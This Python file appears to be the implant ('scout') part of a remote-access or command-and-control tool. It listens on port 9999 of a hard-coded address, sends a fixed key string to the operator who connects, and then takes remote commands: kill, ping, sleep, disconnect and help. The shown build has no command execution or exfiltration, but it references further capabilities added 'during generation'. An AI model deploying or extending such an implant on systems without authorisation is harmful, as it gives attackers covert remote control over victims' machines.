import socket
from os import _exit
from time import sleep

help_menu = '''
Scout Help Menu
===============
   Base Commands :
      disconnect        Disconnects the scout
      flush <timeout>   Flush the socket buffer, the socket timeout argument is optional and defaults to 5 for the socket timeout in flushing
      help              Show the help menu or help for specific command, alias of the command is "?"
      kill              Kills the scout
      ping              Ping the scout
      sleep             Make the scout disconnect and sleep for a specified amount of time
'''

def recv_all(sock):
    sock.settimeout(None)
    try:
        data = sock.recv(1000000)
        processed_data = data.decode()
        target_length = int(processed_data.split("|",1)[0]) 
        data = data[len(str(target_length))+1:] 
    except UnicodeDecodeError:
        target_length = int(data.decode(encoding='utf-8', errors='ignore').split("|",1)[0])
        data = data[len(str(target_length))+1:] 
    received_data_length = len(data) 
    if received_data_length >= target_length: 
        try:
            return data.decode()
        except UnicodeDecodeError:
            return data
    sock.settimeout(3) 
    while received_data_length < target_length: 
        try:
            tmp_data = sock.recv(1000000)
            if not tmp_data:
                raise socket.error
            data += tmp_data
            received_data_length += 1000000
        except (socket.error, socket.timeout):
            break
    try:
        return data.decode()
    except UnicodeDecodeError:
        return data
def send_all(sock, data):
    try:
        sock.sendall((str(len(data)) + "|" + data).encode())
    except TypeError:
        sock.sendall(str(len(data)).encode() + b"|" + data)
host_list = ['192.168.1.128']
while True:
    connected = False
    while True:
        for i in host_list:
            try:
                sock = socket.socket()
                sock.settimeout(5)
                sock.bind((i,9999))
                sock.listen(1)
                s, a = sock.accept()
                send_all(s,'KTJT^o%dT(1WD^&Q8!!@z15T1EaT6KyGtsUIKFcLRP88%JxEhb')
                connected = True
                break
            except (socket.timeout,socket.error):
                continue
        if connected:
            break
    while True:
        try:
            data = recv_all(s)
            command = data.split(' ',1)[0]
            if command == 'kill':
                send_all(s,'[*]Scout is killing itself...')
                _exit(1)
            elif command in ('help','?'):
                send_all(s,help_menu)
            elif command == 'ping':
                send_all(s,'[+]Scout is alive')
            elif command == 'sleep':
                length = int(data.split(' ',1)[1])
                send_all(s,'[*]Scout is sleeping...')
                for i in range(length):
                    sleep(1)
                break
            elif command == 'disconnect':
                send_all(s,'[*]Scout is disconnecting itself...')
                sleep(3)
                break
            else:
                send_all(s,'[-]Scout does not have the capability to run this command. (Was it loaded during generation?)')
        except (socket.error,socket.timeout,ConnectionResetError) as e:
            try:
                if type(e) not in (socket.error,socket.timeout,ConnectionResetError):
                    raise e
                s.close()
                break
            except IndexError:
                send_all(s,'[-]Please supply valid arguments for the command you are running')
            except Exception as e:
                send_all(s,'[!]Error in scout : ' + str(e))
        except IndexError:
            send_all(s,'[-]Please supply valid arguments for the command you are running')
        except Exception as e:
            send_all(s,'[!]Error in scout : ' + str(e))